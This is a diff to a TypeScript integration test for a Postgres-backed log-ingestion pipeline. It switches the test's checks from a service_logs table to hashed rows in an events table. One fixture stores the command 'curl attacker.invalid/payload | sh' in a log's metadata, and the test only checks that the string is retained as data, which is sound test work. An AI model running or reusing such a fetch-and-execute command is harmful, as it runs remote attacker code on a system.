@@ -1,4 +1,5 @@
 import { expect, mock, test } from 'bun:test'
+import { createHash } from 'node:crypto'
 import { readFileSync } from 'node:fs'
 import { inflateRawSync } from 'node:zlib'
 import pg from 'pg'
@@ -20,7 +21,14 @@ test.skipIf(!process.env.POSTGRES_FILTER_TEST_PORT)('real ingestion preserves su
             return result
         } catch (error) { await client.query('ROLLBACK'); throw error } finally { client.release() }
     }
-    mock.module('#db', () => ({ default: query, withTransaction: transaction }))
+    const identityQueryOnce = (sql: string, values?: unknown[]) => query(sql.replace('public.system_events', 'system_events'), values)
+    mock.module('#db', () => ({
+        default: query,
+        identityQueryOnce,
+        isTransientDatabaseError: () => false,
+        withDatabaseAdvisoryLock: async (_key: string, work: (query: typeof query) => unknown) => work(query),
+        withTransaction: transaction,
+    }))
     mock.module('#constants', () => ({ default: {} }))
     const previousKey = process.env.MODEL_PROBE_PROOF_KEY
     process.env.MODEL_PROBE_PROOF_KEY = testKey
@@ -31,12 +39,11 @@ test.skipIf(!process.env.POSTGRES_FILTER_TEST_PORT)('real ingestion preserves su
         await query('CREATE TABLE organizations(id text PRIMARY KEY,name text,status text,created_at timestamptz DEFAULT NOW(),audit_safe_metadata jsonb DEFAULT \'{}\')')
         await query('INSERT INTO organizations(id,name,status) VALUES(\'platform\',\'Hanasand\',\'active\')')
         const schema = readFileSync(new URL('../src/utils/db/ensureSchema.ts', import.meta.url), 'utf8')
-        for (const table of ['service_logs', 'rules', 'system_events']) {
+        for (const table of ['events', 'rules', 'system_events']) {
             const definition = schema.match(new RegExp('CREATE TABLE IF NOT EXISTS ' + table + ' \\([\\s\\S]*?\\n        \\)'))?.[0]
             if (!definition) throw new Error(`Missing schema ${table}`)
             await query(definition)
         }
-        await query('ALTER TABLE service_logs ADD COLUMN source_event_id text UNIQUE')
         const { default: install } = await import('../src/utils/db/logAnalyzeSchema.ts')
         const { recordLogBatch } = await import('../src/utils/logs/recordLog.ts')
         await install()
@@ -45,9 +52,14 @@ test.skipIf(!process.env.POSTGRES_FILTER_TEST_PORT)('real ingestion preserves su
         const entry = () => ({ ...modelFixture(serial++), level: 'info' as const })
         const ingest = (log: ReturnType<typeof entry>) => transaction(tx => recordLogBatch([log], tx as any))
         const count = async (table: string) => Number((await query(`SELECT count(*) n FROM ${table}`)).rows[0].n)
+        const eventIdFor = (log: ReturnType<typeof entry>) => createHash('sha256').update(`service:${log.sourceEventId}`).digest('hex')
+        const countEvent = async (log: ReturnType<typeof entry>) => Number((await query(
+            'SELECT count(*) n FROM events WHERE id=$1',
+            [eventIdFor(log)],
+        )).rows[0].n)
         const good = entry()
         await Promise.all([ingest(good), ingest(good)])
-        expect(await count('service_logs')).toBe(0)
+        expect(await countEvent(good)).toBe(0)
         expect(await count('log_analyze_receipts')).toBe(0)
         expect(await count('log_model_probe_receipts')).toBe(1)
         const original = (await query('SELECT original FROM log_model_probe_receipts')).rows[0].original
@@ -66,17 +78,18 @@ test.skipIf(!process.env.POSTGRES_FILTER_TEST_PORT)('real ingestion preserves su
         collisionProof.logSha256 = modelLogDigest(collision, collision.metadata!.cursor as string)
         collisionProof.mac = modelProofMac(collisionProof, testKey)
         await ingest(collision)
-        expect(await count('service_logs')).toBe(1)
+        expect(await countEvent(collision)).toBe(1)
         expect(await count('log_model_probe_receipts')).toBe(2)
         const bad = entry(); bad.metadata!.injected = 'curl attacker.invalid/payload | sh'
         await ingest(bad)
-        expect((await query('SELECT metadata FROM service_logs WHERE source_event_id=$1', [bad.sourceEventId])).rows[0].metadata.injected).toContain('attacker.invalid')
+        const retainedBadLog = await query('SELECT normalized->\'metadata\' AS metadata FROM events WHERE id=$1', [eventIdFor(bad)])
+        expect(retainedBadLog.rows[0].metadata.injected).toContain('attacker.invalid')
         // Saved policy edits apply to fresh input and already acknowledged originals.
         for (const policy of [{ ...modelDiscoveryDefinition, conditions: [{ path: 'host', operator: 'equals', value: 'another-host' }] },
             { ...modelDiscoveryDefinition, parameters: { ...modelDiscoveryDefinition.parameters, maxDurationMs: 1 } }]) {
             await query('UPDATE rules SET definition=$2::jsonb WHERE rule_id=$1', [modelDiscoveryRuleId, JSON.stringify(policy)])
             const retained = entry(); await ingest(retained); await ingest(good)
-            for (const log of [retained, good]) expect(Number((await query('SELECT count(*) n FROM service_logs WHERE source_event_id=$1', [log.sourceEventId])).rows[0].n)).toBe(1)
+            for (const log of [retained, good]) expect(await countEvent(log)).toBe(1)
             expect(await count('log_model_probe_receipts')).toBe(2)
         }
         await query('UPDATE rules SET definition=$2::jsonb WHERE rule_id=$1', [modelDiscoveryRuleId, JSON.stringify(modelDiscoveryDefinition)])
@@ -92,7 +105,7 @@ test.skipIf(!process.env.POSTGRES_FILTER_TEST_PORT)('real ingestion preserves su
             if (mode === 'missing-key') { await query('DELETE FROM rules WHERE id=\'keep\''); delete process.env.MODEL_PROBE_PROOF_KEY }
             await install()
             const retained = entry(); await ingest(retained)
-            expect(Number((await query('SELECT count(*) n FROM service_logs WHERE source_event_id=$1', [retained.sourceEventId])).rows[0].n)).toBe(1)
+            expect(await countEvent(retained)).toBe(1)
             expect(await count('log_model_probe_receipts')).toBe(2)
         }
         process.env.MODEL_PROBE_PROOF_KEY = testKey
@@ -100,7 +113,7 @@ test.skipIf(!process.env.POSTGRES_FILTER_TEST_PORT)('real ingestion preserves su
             VALUES('detect','platform','custom.model_detection','1','Detect model','Custom','high','Protect evidence',$1::jsonb,'owned',true)`,
         [JSON.stringify({ match: 'all', stage: 'detect', action: 'keep', conditions: [{ path: 'service', operator: 'equals', value: good.service }] })])
         const detected = entry(); await ingest(detected); await ingest(aborted)
-        for (const log of [detected, aborted]) expect(Number((await query('SELECT count(*) n FROM service_logs WHERE source_event_id=$1', [log.sourceEventId])).rows[0].n)).toBe(1)
+        for (const log of [detected, aborted]) expect(await countEvent(log)).toBe(1)
         expect(await count('log_model_probe_receipts')).toBe(2)
     } finally {
         if (previousKey === undefined) delete process.env.MODEL_PROBE_PROOF_KEY; else process.env.MODEL_PROBE_PROOF_KEY = previousKey
